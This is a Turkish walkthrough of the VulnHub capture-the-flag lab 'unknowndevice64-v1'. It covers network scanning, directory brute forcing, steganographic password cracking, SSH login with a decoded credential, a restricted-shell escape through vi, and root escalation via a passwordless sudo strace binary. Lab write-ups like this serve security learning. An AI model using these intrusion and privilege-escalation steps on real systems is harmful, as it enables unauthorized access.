# UNKNOWNDEVICE64-V1 Kutusunun Çözümü
**Yazar:** Beren Kuday GÖRÜN<br>
**Tarih:** 05.05.2019<br>
**IP:** 192.168.171.136<br>
**Not:** Kutunun indirme adresi 'kutu' isimli klasöre eklenmiştir.<br>
**Flag:** /root/flag.txt'yi oku<br>
**Sayfa:** https://www.vulnhub.com/entry/unknowndevice64-1,293/

## 1.	Bilgi Toplama
### 1.1	Ip Tespiti:
```sh
root@kali:~/Documents/Kutular# arp-scan -l
```
```sh
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.171.1	00:50:56:c0:00:08	VMware, Inc.
192.168.171.2	00:50:56:ff:0c:9c	VMware, Inc.
192.168.171.137	00:0c:29:37:bf:aa	VMware, Inc.
192.168.171.254	00:50:56:e6:7d:d6	VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.5: 256 hosts scanned in 2.776 seconds (92.22 hosts/sec). 4 responded
```
Kutunun IP adresi: 192.168.171.137
### 1.2	Servis Tespiti:
```sh
nmap 192.168.171.137 -A -p-
```
```sh
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-05 17:56 EDT
Nmap scan report for 192.168.171.137
Host is up (0.00086s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
1337/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:af:04:6d:f1:8c:59:3a:d6:e1:96:b7:f7:fc:57:83 (RSA)
|   256 12:68:4c:6b:96:1e:51:59:32:8a:3d:41:0d:55:6b:d2 (ECDSA)
|_  256 da:3e:28:52:30:72:7a:dd:c3:fb:89:7e:54:f4:bb:fb (ED25519)
31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
|_http-title:    Website By Unknowndevice64   
MAC Address: 00:0C:29:37:BF:AA (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms 192.168.171.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.77 seconds
```
1337. portta SSH servisinin çalıştığını gördüm ve belki tutar diye hydra ile root için ssh servisine bruteforce saldırısına başladım. Ancak bir sonuç çıkmadı. Zaten OpenSSH kendi konfigürasyonlarında varsayılan olarak root kullanıcısı ile ssh oturumu açılmasına izin vermemektedir.
31337. portta bir python sunucusu çalıştırılıyor. Bu çok iyi bir bilgi ilk başta yorum yaparak karşı tarafta php yada asp.net dosyalarının olmadığını düşünebiliriz ve yanlış olmaz. Hiç bir tıkanılan noktalarda php ve asp.net dosyalarına bakacağım. Nikto ile küçük bir test yapıp daha sonrasında dirb ile normal bir şekilde daha ve python dosyalar için bruteforce işlemi gerçekleştireceğim.
```sh
dirb http://192.168.171.137:31337 -X .py
```
```sh
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun May  5 18:04:07 2019
URL_BASE: http://192.168.171.137:31337/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.py) | (.py) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.171.137:31337/ ----
+ http://192.168.171.137:31337/server.py (CODE:200|SIZE:306)                                            
                                                                                                        
-----------------
END_TIME: Sun May  5 18:04:26 2019
DOWNLOADED: 4612 - FOUND: 2
```
Aslında beklenen bir sonuç genel olarak kodlarına baktığımızda basit bir server kodu yazılmış. Bundna dolayı burada açıklama gereği görmedim
Nikto çıktısında da bir sonuç elde edemedim ve tarayıcıda sayfayı görüntüledim
Sayfanın kaynak kodlarında yorum satırlarında ilgimi çeken bazı şeyler gördüm
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<body>
<title>   Website By Unknowndevice64   </title>  
<head> <meta http-equiv="Content-Type" content="text/html;charset=UTF-8"> <link href="" rel="icon" type="image/png"/> <link type="text/css" rel="stylesheet" href="http://fonts.googleapis.com/css?family=Share+Tech+Mono"> <link type="text/css" rel="stylesheet" href="http://fonts.googleapis.com/css?family=Geo"> 
<meta content="Website By Unknowndevice64 | ud64   name="description"/> 
<meta content="Website By Unknowndevice64 | ud64  name="keywords"/> 
<meta content="Website By Unknowndevice64 | ud64  name="Abstract"/> 
<meta name="Website By Unknowndevice64 | ud64"/>  
</head> 
<style type="text/css" media="all"> html,body{margin:0;padding:0;} #text-shadow-box{position:fixed;left:0;right:0;top:0;bottom:0;width:100%;height:100%;overflow:hidden;background:#ffffff;font-family:Stencil,Arial,sans-serif;-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-user-select:none;} #text-shadow-box #tsb-text,#text-shadow-box #tsb-link{position:absolute;top:49%;left:0;width:100%;height:1em;margin:-0.77em 0 0 0;font-size:70px;line-height:1em;font-weight:bold;text-align:center;} #text-shadow-box #tsb-text{font-size:100px;color:transparent;text-shadow:black 0px -45.2px 19px;} #text-shadow-box #tsb-link a{color:#FFF;text-decoration:none;} #text-shadow-box #tsb-box,#text-shadow-box #tsb-wall{position:absolute;top:50%;left:0;width:100%;height:60%;} #text-shadow-box #tsb-box{-webkit-box-shadow:black 0px -45.2px 39px;-moz-box-shadow:black 0px -45.2px 39px;} #text-shadow-box #tsb-wall{background:#ffffff;} #text-shadow-box #tsb-wall p{position:relative;font-size:15px;line-height:1.5em;text-align:justify;color:#222;width:550px;margin:1.5em auto;cursor:default;} #text-shadow-box #tsb-wall p a{color:#fff;} #text-shadow-box #tsb-wall p a:hover{text-decoration:none;color:#000;background:#fff;} #tsb-spot{position:absolute;top:-50%;left:-50%;width:200%;height:200%;pointer-events:none;background:-webkit-gradient(radial,center center,0,center center,450,from(rgba(0,0,0,0)),to(rgba(0,0,0,1)));background:-moz-radial-gradient(center 45deg,circle closest-side,transparent 0,black 450px);} #blue{color:#0062ff;} </style> <!--    [if IE]> 

<style type="text/css"> /* Sadly no IE9 support for pointer-events: none; nor CSS2 text-shadow */ #tsb-spot {     display: none; } #tsb-ie {     position: absolute;     top: -90%;     left: -50%;     width: 200%;     height: 334%;     background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgY3g9IjUwJSIgY3k9IjUwJSIgcj0iNzUlIj4KICAgIDxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiMwMDAwMDAiIHN0b3Atb3BhY2l0eT0iMCIvPgogICAgPHN0b3Agb2Zmc2V0PSI3NCUiIHN0b3AtY29sb3I9IiMwMDAwMDAiIHN0b3Atb3BhY2l0eT0iMSIvPgogICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjMDAwMDAwIiBzdG9wLW9wYWNpdHk9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyZWN0IHg9Ii01MCIgeT0iLTUwIiB3aWR0aD0iMTAxIiBoZWlnaHQ9IjEwMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+); } </style> 
<![endif]    --> </center>  <div id="text-shadow-box">      <div style="box-shadow: 0px 75.2px 57px black;" id="tsb-box">         </div></center>       <p style="text-shadow: -112.8px 75.2px 37px black;" id="tsb-text">ud64       <p id="tsb-link">      
<a href="#" target="_blank">ud64</a>           <div id="tsb-wall">           <div id="tsb-ie">             </div>                                   <center> <img src="ud64.gif" width="200" height="200"> ### “Not a visible enthusiasm but a <span style="color:red">h1dd3n</span> one, an excitement burning with a cold flame.”  <h2></h2> <h2>Thanks to: ./AjayVerma (AKA unknowndevice64)</h2> <h5>2018</h5>  </center>
<div id="ttecleado" ?="">                                  <table>                       <tbody>                           <tr>                               <td colspan="2">                                                                    </td>                               <td colspan="2">                                 </td>                             </tr>                           <tr>                             </tr>                         </tbody>                     </table>                 </center>             </div><br />    </div><span style="color: rgb(0, 98, 255); font-family: Tahoma; font-size: 18px;">****</span>    <div style="background-position: 282px -284px;" id="tsb-spot">         </div><span style="color: rgb(0, 98, 255); font-family: Tahoma; font-size: 18px;">****</span> </div>   <script type="text/javascript" language="javascript" charset="utf-8"> /**  *   *   * just happy (^_^)  *  * Power . . . of Shadows . . .  */ var text = null; var spot = null; var box = null; var boxProperty = ''; init(); function init() {     text = document.getElementById('tsb-text');     spot = document.getElementById('tsb-spot');     box = document.getElementById('tsb-box');     if (typeof box.style.webkitBoxShadow == 'string') {         boxProperty = 'webkitBoxShadow';     } else if (typeof box.style.MozBoxShadow == 'string') {         boxProperty = 'MozBoxShadow';     } else if (typeof box.style.boxShadow == 'string') {         boxProperty = 'boxShadow';     }     if (text && spot && box) {         document.getElementById('text-shadow-box').onmousemove = onMouseMove;         document.getElementById('text-shadow-box').ontouchmove = function (e) {e.preventDefault(); e.stopPropagation(); onMouseMove({clientX: e.touches[0].clientX, clientY: e.touches[0].clientY});};     } } function onMouseMove(e) {     if (typeof e === 'undefined' || typeof e.clientX === 'undefined') {         return;     }     var xm = (e.clientX - Math.floor(window.innerWidth / 2)) * 0.4;     var ym = (e.clientY - Math.floor(window.innerHeight / 3)) * 0.4;     var d = Math.round(Math.sqrt(xm*xm + ym*ym) / 5);     text.style.textShadow = -xm + 'px ' + -ym + 'px ' + (d + 10) + 'px black';     if (boxProperty) {         box.style[boxProperty] = '0 ' + -ym + 'px ' + (d + 30) + 'px black';     }     xm = e.clientX - Math.floor(window.innerWidth / 2);     ym = e.clientY - Math.floor(window.innerHeight / 2);     spot.style.backgroundPosition = xm + 'px ' + ym + 'px'; } </script> /*         <center>   <div align="center">  #outerCircleText { /* Optional - DO NOT SET FONT-SIZE HERE, SET IT IN THE SCRIPT */ font-style: Electrofied; font-weight: bold; font-family: 'Electrofied', Electrofied, Electrofied; color: white; /* End Optional */  /* Start Required - Do Not Edit */ position: absolute;top: 0;left: 0;z-index: 3000;cursor: default;} #outerCircleText div {position: relative;} #outerCircleText div div {position: absolute;top: 0;left: 0;text-align: center;} /* End Required */ /* End Circle Text Styles */ </style>   </center> </body></span><br />
          <br />
          <p class="para" align="left">Website By Unknowndevice64
<!-- key_is_h1dd3n.jpg -->
&nbsp;
&nbsp;
&nbsp;
&nbsp;
./Ajay Verma &nbsp;
                
        </div>

            
            </div>
            
</head>

</body>

</html>
```
Yorum satırlarını daha düzenli bir şekilde görüntüleyebilmek için yazmış olduğum basit bir scripti çalıştırdım. (bs kütüphanesini kullanarak yorum satırlarını parse eden bir script - kaynak kodları dosyalar klasöründe)
```html
python3 yorumlar4site.py http://192.168.171.137:31337/
sh[if IE]> 

<style type="text/css"> /* Sadly no IE9 support for pointer-events: none; nor CSS2 text-shadow */ #tsb-spot {     display: none; } #tsb-ie {     position: absolute;     top: -90%;     left: -50%;     width: 200%;     height: 334%;     background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgY3g9IjUwJSIgY3k9IjUwJSIgcj0iNzUlIj4KICAgIDxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiMwMDAwMDAiIHN0b3Atb3BhY2l0eT0iMCIvPgogICAgPHN0b3Agb2Zmc2V0PSI3NCUiIHN0b3AtY29sb3I9IiMwMDAwMDAiIHN0b3Atb3BhY2l0eT0iMSIvPgogICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjMDAwMDAwIiBzdG9wLW9wYWNpdHk9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyZWN0IHg9Ii01MCIgeT0iLTUwIiB3aWR0aD0iMTAxIiBoZWlnaHQ9IjEwMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+); } </style> 
<![endif]    
 key_is_h1dd3n.jpg 
 ```
key_is_h1dd3n.jpg  isimli bir dosya var ve temel bir CTF senaryosu gibi gözüküyor. Bu dosyadan bir şeyler çıkarmamız bekleniyor olabilir.
Fotoğrafı indirip ilk başta file, strings gibi araçlarla kontroller yaptım ancak bir şey bulamadım
Daha sonra Steganografi toollarından olan stegsolve.jar aracı ile farklı filtreler uygulayarak belki saklanmış bir mesaj bulurum ümidiyle inceleme yaptım ancak bir sonuç elde edemedim
`java -jar stegsolve.jar`
Komutunu uyguladıktan sonra resim dosyasını açıp farklı filtreler uygulanabilir.
key_is_h1dd3n demesinden dolayı içerisine başka bir dosya saklanmış ihtimali üzerinde durdum ve 
`steghide extract -sf key_is_h1dd3n.jpg`
Evet dosya şifrelenmiş. İnternet sayfasındaki bütün kelimelerden bir wordlist oluşturup bruteforce yaptığımda şifrenin h1dd3n olduğu ortaya çıktı
`cat h1dd3n.txt`
```sh++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.-----------------.<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.++++++++++++.>++++++++++++++++++++++++++++++++++++++++.-----------------.
```
1993'lü yıllara gittik. Bu bir brainfuck dilidir. Pointer mantığına dayanan aslında programcıların eğlence amaçlı kullanması için geliştirilmiş çok bilinmeyen < > - gibi aslında basit assembly komutlarını temsil eden en küçük compiler'a sahip dillerden biridir. Daha ayrıntılı araştırma için Urban Müller'in yazıları okunulabilir.
İnternet üzerinden online bir şekilde derlendiğinde çıkan sonuç aşağıdaki gibidir...
`ud64:1M!#64@ud`
Aslında biraz john çıktısını andırıyor. Bundan dolayı aklıma ilk olarak ssh geldi.

## 2	Zayıflık Tarama
ssh sürümü için internette exploit taraması yaptım ancak sonuç alabildiğim bir şey olmadı
py server için internette exploit taraması yaptım ancak sonuç alabildiğim bir şey olmadı

## 3	Sisteme Sızma
`ssh ud64@192.168.171.137 -p 1337`
Şifre olarak 1M!#64@ud girdiğimizde içerdeyiz.
```sh
ud64@unknowndevice64_v1:~$ whoami
ud64
```
Terminalde bazı komutların çalışmadığını gördüm örnek olarak ls gibi bunun üzerine PATH'e bakmaya karar verdim.
```sh
ud64@unknowndevice64_v1:~$ echo $PATH
/home/ud64/prog
```
PATH için bazı eklemeler yapmalıyız.
```sh
ud64@unknowndevice64_v1:~$ PATH = $PATH:/usr/bin/:/bin/:
-rbash: PATH: command not found
```
evet echo $SHELL yazdığımızda rbash içerisinde olduğumuzu görebiliriz. /bin/bash ya da sh bizim için en iyi tercihler olacağı için, PATH'ime gidip orada bulunan programlara bir baktım. Normal şartlar altında oralara gidemiyorum ancak ls yazmadan gerekli yolu azıp tab tuşuna bastığımda programlar listeniyordu.>
cd /home/ud64/prog/ yazdıp tab tuşuna bastığımda vi programını gördüm.

```sh
ud64@unknowndevice64_v1:~$ cd prog/
date    id      vi      whoami 
```
vi'nin içerisine girip 
`:!/bin/bash`

```sh
~
~
~
~
~
~
~
~
bash-4.4$ 
bash-4.4$ 
bash-4.4$ 
bash-4.4$ 
bash-4.4$ 
bash-4.4$ 
bash-4.4$ 
```
Ve artık bash ekranındayım. Ancak hala bir sorun var ls gibi komutlar için, bunun nedeni PATH. Ekleme işlemini yaptıktan sonra sorun ortadan kalakcaktır.
```sh
bash-4.4$ PATH=$PATH:/bin/:/usr/bin/
bash-4.4$ echo $PATH
/home/ud64/prog:/bin/:/usr/bin/
```
Evet artık komutlarımız çalışmaktadır. Flag olarak bizden /root/flag.txt dosyasını okumamızı istiyorlar. Ancak /root klasörüne girmeye çalışırken yetki hatası ile karşılaşıyoruz.
Kullanıcının erişime sahip olduğu programları listelemek için sudo -l'yi kullanabiliriz. BU komut aslında büyük projelerde orta çalışmalarda hangi kullanıcının hangi programları kullanabileceğini göstermek için kullanılıyor. Biz şimdilik bu düşüncenin dışına çıkarak kendi çıkarımızda kullanacağız.
```sh
bash-4.4$ sudo -l
```
```sh
User ud64 may run the following commands on unknowndevice64_v1:
    (ALL) NOPASSWD: /usr/bin/sysud64
```
/usr/bin/sysud64 -h yaptığımızda çıkan parametrelre bir fikir veriyordu ancak /usr/bin/sysud64 -V komutu ile bu uygulamanın bir strace olduğunu anladım. Strace ile birlikte çalıştırılan programlarda, programlara bağlanan stract sistem kaynaklarının nasıl kullanıldığını görmemize sağlar. Genel olarak debug ile ilgilenen ya da gömülü sistemcilerin kullandığı bir yapıdır.

## 4	Yetki Yükseltme
```sh
bash-4.4$ ls /usr/bin/sysud64 -al
```
```sh
-rwxr-xr-x 1 root root 957688 Dec 31 07:15 /usr/bin/sysud64
```
Görüldüğü üzere program root ve sudo -l çıktısı ile şifresiz bir şekilde kullanabileceğimizi görmüştük.
Programı /bin/sh ile başlatırsak root olarak shell almış olacağızdır.

```sh
bash-4.4$ sudo sysud64 -o /dev/null /bin/sh
sh-4.4# whoami
root
```

Artık root'uz! program üzerinde -o /dev/null dememizin sebebi ekran çıktılarını null cihazına gönderdik ki ekrana basmasın.
Şimdi flag'imizi okuyalım...

```sh
sh-4.4# cd /root/
sh-4.4# ls
Desktop  Documents  Downloads  Music  Pictures	Public	Videos	flag.txt
sh-4.4# cat flag.txt 
  ___    _                _                                  
 / _ \  | |              | |                                 
/ /_\ \ | |__   __ _  ___| | _____ _ __                      
|  _  | | '_ \ / _` |/ __| |/ / _ \ '__|                     
| | | | | | | | (_| | (__|   <  __/ |                        
\_| |_/ |_| |_|\__,_|\___|_|\_\___|_|                        
                                                             
                                                             
     _                    __             _                   
    | |                  / _|           | |                  
  __| | ___   ___  ___  | |_ ___  _ __  | | _____   _____    
 / _` |/ _ \ / _ \/ __| |  _/ _ \| '__| | |/ _ \ \ / / _ \   
| (_| | (_) |  __/\__ \ | || (_) | |    | | (_) \ V /  __/   
 \__,_|\___/ \___||___/ |_| \___/|_|    |_|\___/ \_/ \___|   
                                                             
                                                             
          _           _           _   _                      
         | |         | |         | | | |                     
__      _| |__   __ _| |_    ___ | |_| |__   ___ _ __ ___    
\ \ /\ / / '_ \ / _` | __|  / _ \| __| '_ \ / _ \ '__/ __|   
 \ V  V /| | | | (_| | |_  | (_) | |_| | | |  __/ |  \__ \   
  \_/\_/ |_| |_|\__,_|\__|  \___/ \__|_| |_|\___|_|  |___/   
                                                             
                                                             
                     _     _               _         _       
                    | |   | |             | |       | |      
__      _____  _   _| | __| |  _ __   ___ | |_    __| | ___  
\ \ /\ / / _ \| | | | |/ _` | | '_ \ / _ \| __|  / _` |/ _ \ 
 \ V  V / (_) | |_| | | (_| | | | | | (_) | |_  | (_| | (_) |
  \_/\_/ \___/ \__,_|_|\__,_| |_| |_|\___/ \__|  \__,_|\___/ 
                                                             
                                                             
  __                                                         
 / _|                                                        
| |_ ___  _ __   _ __ ___   ___  _ __   ___ _   _            
|  _/ _ \| '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |           
| || (_) | |    | | | | | | (_) | | | |  __/ |_| |_          
|_| \___/|_|    |_| |_| |_|\___/|_| |_|\___|\__, (_)         
                                             __/ |           
                                            |___/            



   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( . | / | u | n | k | n | o | w | n | d | e | v | i | c | e | 6 | 4 )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 




```

### Kaynaklar:### 
https://bencane.com/2011/08/17/sudo-list-available-commands/
https://medium.com/@gokhansengun/strace-ne-i%C5%9Fe-yarar-ve-nas%C4%B1l-kullan%C4%B1l%C4%B1r-c46036ffa0
https://tr.wikipedia.org/wiki/Brainfuck
